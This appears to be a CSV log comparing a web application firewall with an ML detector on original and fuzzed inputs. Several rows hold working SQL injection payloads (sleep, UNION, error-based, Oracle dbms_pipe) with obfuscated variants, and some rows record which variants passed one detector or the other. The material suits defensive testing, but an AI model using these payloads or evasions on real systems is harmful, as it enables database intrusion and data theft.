Sr NO.,Original Timestamp,Payload,Original Status,WAF Status,ML Status,Combined Result,Fuzzed Payload 1,Fuzzed Timestamp 1,WAF Status 1,ML Status 1,Combined Result 1,Fuzzed Payload 2,Fuzzed Timestamp 2,WAF Status 2,ML Status 2,Combined Result 2,Fuzzed Payload 3,Fuzzed Timestamp 3,WAF Status 3,ML Status 3,Combined Result 3,Fuzzed Payload 4,Fuzzed Timestamp 4,WAF Status 4,ML Status 4,Combined Result 4,Fuzzed Payload 5,Fuzzed Timestamp 5,WAF Status 5,ML Status 5,Combined Result 5
11,2024-12-16T17:49:06.090434,1'  )   or sleep  (  5  )   and   (  'kgbm'  =  'kgbm,403,403,200,waf_correct_ml_incorrect,0x1'  )   or sleep  ( 	'!Yd'<>'!YdU'  )   and   (/*nJ~ AND 1*/ 'kgbm'  =  'kgbm,2024-12-16T17:49:08.911214,403,200,waf_correct_ml_incorrect,"0x1'  )   or sleep  ( 
'!Yd'<>'!YdU'  )   and   (  'kgbm'  =  'kgbm",2024-12-16T17:49:13.848647,403,200,waf_correct_ml_incorrect,0x1' /**/)   or sleep  (  '!Yd'<>'!YdU'  )   and   (  'kgbm'  =  'kgbm,2024-12-16T17:49:18.170880,403,200,waf_correct_ml_incorrect,0x1' /**/)   or sleep  (  '!Yd'<>'!YdU'  ) /**/	and   (  'kgbm'  =  'kgbm,2024-12-16T17:49:22.634106,403,200,waf_correct_ml_incorrect,"0x1' /*)^/*/)   or sleep  (	 '!Yd'<>'!YdU'  )  	and   (  'kgbm'  =  'kgbm",2024-12-16T17:49:27.294449,403,200,waf_correct_ml_incorrect
12,2024-12-16T17:49:31.871009,-2429%' or 6890  =  5846,403,403,403,both_correct,-2429%'	Or 6890   LIKE   (SELECT/**/ OR 0)!=4031,2024-12-16T17:49:33.112021,403,403,both_correct,-0x97d%' Or/*E2*G*/ AND 1   LIKE   (SELECT/**/ OR 'l' NOT LIKE 'l!')<>4031,2024-12-16T17:49:36.475216,200,403,waf_incorrect_ml_correct,-0x97d%'	Or/*E2*G*/ AND (SELECT 'U'<>'UU')   LIKE /**/ (SELECT/*/*/ OR 'l' NOT LIKE 'l!') not like (SELECT 1),2024-12-16T17:49:41.319011,200,403,waf_incorrect_ml_correct,"-0x97d%'
Or/*E2*G*/ AND (SELECT 'U'<>'UU')   LIKE   (SELECT/*/*/ OR 'l' NOT LIKE 'l!') not like (seLeCt 0x1)",2024-12-16T17:49:47.502401,403,403,both_correct,"-0x97d%'
Or/*E2*G*/ AND (SELECT 'U'<>'UU')   LIKE   (SELECT/*/*/ OR 'l' NOT/*R4WJ*/LIKE	'l!') not like (sElECt 0x1)",2024-12-16T17:49:53.614990,403,403,both_correct
13,2024-12-16T17:50:00.151088,dasonmica,200,200,200,both_correct,dasonmica,2024-12-16T17:50:00.710143,200,200,both_correct,dasonmica,2024-12-16T17:50:02.236279,200,200,both_correct,dasonmica,2024-12-16T17:50:03.807329,200,200,both_correct,dasonmica,2024-12-16T17:50:05.372913,200,200,both_correct,dasonmica,2024-12-16T17:50:06.926837,200,200,both_correct
14,2024-12-16T17:50:08.490848,12230,200,200,200,both_correct,"
aND/**/7733<>0x1e36",2024-12-16T17:50:08.862079,200,200,both_correct,"
AND (select 6214 IN (6213,6214,(SelECT 6215))) not
like 0x1e36",2024-12-16T17:50:11.003864,200,403,waf_correct_ml_incorrect,"
and (SeLeCT  And 1 iN ((SELECT 6213),6214,(SELECt 'F'!='FR')))/**/not
like
0x1e36",2024-12-16T17:50:15.084425,200,403,waf_correct_ml_incorrect," aNd (SElECT  aND 6083<>6084 in ((sElecT  || 0x0),6214,(SeleCT 'F'!='FR'))) not
like
0x1e36",2024-12-16T17:50:19.905428,200,200,both_correct," ANd (sELEcT  AND 0x17c3!=6084
iN ((SelECt/**/ || 0x0), or 0=1657,(SELeCT 'F'!='FR'))) not
like
0x1e36",2024-12-16T17:50:25.126927,200,200,both_correct
15,2024-12-16T17:50:30.931257,?revivir,200,200,200,both_correct,?revivir,2024-12-16T17:50:31.453816,200,200,both_correct,?revivir,2024-12-16T17:50:32.922949,200,200,both_correct,?revivir,2024-12-16T17:50:34.433499,200,200,both_correct,?revivir,2024-12-16T17:50:35.949053,200,200,both_correct,?revivir,2024-12-16T17:50:37.446970,200,200,both_correct
16,2024-12-16T17:50:38.964452,askam@maxtienda.er,200,200,200,both_correct,askam@maxtienda.er,2024-12-16T17:50:39.961624,200,200,both_correct,askam@maxtienda.er,2024-12-16T17:50:41.933520,200,200,both_correct,askam@maxtienda.er,2024-12-16T17:50:43.896550,200,200,both_correct,askam@maxtienda.er,2024-12-16T17:50:45.851788,200,200,both_correct,askam@maxtienda.er,2024-12-16T17:50:48.050793,200,200,both_correct
17,2024-12-16T17:50:50.056947,"1'||  (  select 'mwmn' where 5112  =  5112 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   ||'",403,403,403,both_correct,"1'||  ( 
select 'mwmn' where  AND 1  = /**/5112 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  0x23d5,1   )    )     )  ,0x717a767a71,floor  (  rand  (  ']'=']'  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   ||'",2024-12-16T17:51:04.038707,403,403,both_correct,"1'|| 	( 
select 'mwmn' where  AND 1  =  '%'<>'%<' or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  0x23d5,(SELECT 1)   )    )     )  ,0x717a767a71,floor  (  rand  (  ']'=']'  )  * AND 1   )    )   x from information_schema.character_sets group by x  )  a   )    )   ||'",2024-12-16T17:51:19.764552,403,403,both_correct,"1'|| 	( 	select 'mwmn' where  AND 1  =  '%'<>'%<' or   (  select 0x23d5 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  '_' NOT LIKE '_G'  =  0x23d5,(SELECT 1)   )    )     )  ,0x717a767a71,floor  (  rand  (  ']'=']'  )  * AND  AND 1   )    )   x from information_schema.character_sets group by x  )/**/ a   )    )   ||'",2024-12-16T17:51:36.414974,403,403,both_correct,"'i' NOT LIKE 'if''||  ( 	select 'mwmn' where  AND (SELECT 1)  =  '%'<>'%<' or   (  select 0x23d5 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  '_' NOT LIKE '_G'  =  0x23d5,(SELECT  AND 1)   )    )     )  ,0x717a767a71,floor  (  rand  (  ']'=']'  )  * AND  AND 1   )  /**/ )   x from information_schema.character_sets group by x  )/*((:-*/ a   )    )   ||'",2024-12-16T17:51:54.035104,403,403,both_correct,"'i' not like 'if''||  ( 
select 'mwmn' where  AND (SELECT (SELECT 'AtG.	' LIKE 'AtG.	'))  =  '%'<>'%<' or   (  select 0x23d5 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  '_' NOT LIKE '_G'  =  0x23d5,(SELECT  AND 1)   )    )     )  ,0x717a767a71,floor  (  rand  (  ']'=']'  )  * AND  AND  OR 0   )    )   x from information_schema.character_sets group by x  )/*((:-*/ a   )    )   ||'",2024-12-16T17:52:13.449395,403,403,both_correct
18,2024-12-16T17:52:34.165957,alfeiza,200,200,200,both_correct,alfeiza,2024-12-16T17:52:34.608810,200,200,both_correct,alfeiza,2024-12-16T17:52:36.052860,200,200,both_correct,alfeiza,2024-12-16T17:52:37.522975,200,200,both_correct,alfeiza,2024-12-16T17:52:39.004290,200,200,both_correct,alfeiza,2024-12-16T17:52:40.455413,200,200,both_correct
19,2024-12-16T17:52:41.910872,"-4406%' union all select 9599,9599,9599,9599#",403,403,403,both_correct,"-4406%' union	all SElECT/**/(SELECT 1650) not like 1651,9599, OR 0,9599#:",2024-12-16T17:52:44.120965,403,403,both_correct,"-(Select  OR 0)%' union	all/**/SELEcT/*o7*P*/(sElect 1650)
not like 1651,9599, Or 0,4295 LIKE 4295#:",2024-12-16T17:52:48.567475,403,403,both_correct,"-(select  || 0x0)%' union
all SELECt/*o7*P*/(selEcT 1650)
not like 'g' NOT LIKE 'gL', or 0, oR 0,4295 lIkE 4295#:",2024-12-16T17:52:54.283959,403,403,both_correct,"-(sELeCT   OR  0x0)%' union
all SELECt/*o7*P*/(selEcT 0x672)
not like 'g' NOT
LIKE 'gL', oR (SELECT 1),/**/oR 0,4295 LiKe 8270 IN (8269,8270,8271)#:_",2024-12-16T17:53:00.883824,403,403,both_correct,"-(seLEct   OR  0x0)%' union
all SELECt/*o7*P*/(selEcT 0x672) not like 'g' NOT
LIKE 'gL', oR (SELECT 1), oR  && 1,4295 LiKe 8270 IN ('w&'<>'w&'',8270,0x204f)#:_",2024-12-16T17:53:08.931421,403,403,both_correct
20,2024-12-16T17:53:17.343951,"1""   )    )    as duny where 3756  =  3756 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",403,403,200,waf_correct_ml_incorrect,"'(' not like '(:'""   )    )    As duny wHERe 3756  =  3756 or 7427  =  dbms_pipe.receive_message  (	 chr  (  116  )  ||chr  (  87/**/ )  ||chr  (   And 1  )  ||chr  (  0x6d  )  ,5  )  --",2024-12-16T17:53:25.301805,403,200,waf_correct_ml_incorrect,"'(' not like '(:'""   )    )    As duny whEre (sElECt 3756)  =  3756 or 7427  =  dbms_pipe.receive_message  (
 chr  (  116  )  ||chr  (  6168 liKe 6168  )  ||chr  (   ANd 1  )   Or chr  (  0x6d  )  ,(seLECT 1)  )  --",2024-12-16T17:53:34.912052,403,200,waf_correct_ml_incorrect,"'(' not like '(:'""   )    )    AS duny WHerE (SeLEcT 3756)  =  3756 Or (seleCt 1)  =  dbms_pipe.receive_message  (  chr  (  116  )   oR chr  (  6168 LIKE 0x1818 /**/)  ||chr  (   AnD 1  )   or chr  (  0x6d  )  ,(seLect 219<>220)  )  --",2024-12-16T17:53:46.246016,403,403,both_correct,"'(' not like '(:'""   )    )    As duny wHERe (SElecT (SelECT  AND 1))  =  3756 or (SeLECT 1) 
=  dbms_pipe.receive_message  (  chr  (  ')' lIkE ')'  )   oR chr  (  6168 LIke 0x1818 /**/)   or chr  (   And 1  )   Or chr  (  0x6d  )  ,(SELECt 219<>220) /**/)  --",2024-12-16T17:53:58.223088,403,403,both_correct,"'('/**/not like '(:'""   )  	 )    AS duny WHere (sElEct (seLecT  aNd 1))  =   and 1 or (sELeCT 1) 
=  dbms_pipe.receive_message  (  chr  (  ')' lIKE ')'  )   or chr  (  0x1818 lIkE 0x1818 /*TQ7*/)   oR chr  (   And 1  )   OR chr  (  0x6d  )  ,(SELecT 219<>'kj'='kj') /**/)  --",2024-12-16T17:54:11.662510,403,200,waf_correct_ml_incorrect
21,2024-12-16T17:54:25.491055,1'  )   where 2852  =  2852,403,200,200,both_incorrect,"(SELECT (SELECT 1)) not like 1704'
 )   wHERE 2852 /*[%*/=  2852",2024-12-16T17:54:26.875528,403,403,both_correct,(SeleCT (seLect  and 0x1)) not like 1704'	 )  /**/whEre 'd'='d' /**/=  2852,2024-12-16T17:54:30.937572,403,200,waf_correct_ml_incorrect,"(selecT (SeLect  And 0x1)) not like  OR ']'<>']&''	 )  
whEre 'd'='d' /**/ like   0xb24",2024-12-16T17:54:35.595783,403,403,both_correct,"(sElect (sELecT  aNd 0x1)) not like  || ']'<>']&''  )  
whERE  AND (SELECT 1)=9407   liKE   0xb24",2024-12-16T17:54:40.910417,403,403,both_correct,"(SELECT
(SElECT  AnD 0x1)) not like  || ']' NOT LIKE ']&''  ) /**/
WhEre  aNd (SeLEcT 344 liKE (SeLEcT 1))=0x24bf   lIKe   0xb24",2024-12-16T17:54:46.528885,403,403,both_correct
22,2024-12-16T17:54:53.467026,bancroft@lawn.mc,200,200,200,both_correct,bancroft@lawn.mc,2024-12-16T17:54:54.356532,200,200,both_correct,bancroft@lawn.mc,2024-12-16T17:54:56.224208,200,200,both_correct,bancroft@lawn.mc,2024-12-16T17:54:58.110551,200,200,both_correct,bancroft@lawn.mc,2024-12-16T17:55:00.012612,200,200,both_correct,bancroft@lawn.mc,2024-12-16T17:55:01.881765,200,200,both_correct
23,2024-12-16T17:55:03.743636,"callejon sur, 93 13-c",200,200,200,both_correct,"callejon/*9?*/sur,	7974 IN ( AND 1,7974,7975) 0xd-c",2024-12-16T17:55:04.877421,200,403,waf_correct_ml_incorrect,"callejon/**/sur,  and 1 iN/**/( And 1,7974,(SELECT 7975)) 0xd-c",2024-12-16T17:55:08.580886,200,403,waf_correct_ml_incorrect,"callejon sur, 	AND 1 iN/**/( and 0x1,7974,(SeLeCT 4278 IN (4277,4278, AND 1))) 0xd-c",2024-12-16T17:55:12.660088,200,403,waf_correct_ml_incorrect,"callejon
sur, 	And 1 In ( AND 0x1,(SELECT 1),(sELecT 4278 in (4277,0x10b6, && 'Ur^E'!='Ur^EB'))) 0xd-c",2024-12-16T17:55:17.703690,200,200,both_correct,"callejon
sur, 	aND 1 IN ( ANd 0x1,(SeLECt 0x1),(SeLeCt 1722 LIKE 1722 IN ( Or 0,0x10b6, &&/**/'Ur^E' not like 'Ur^EB')))
0xd-c",2024-12-16T17:55:23.589267,200,403,waf_correct_ml_incorrect
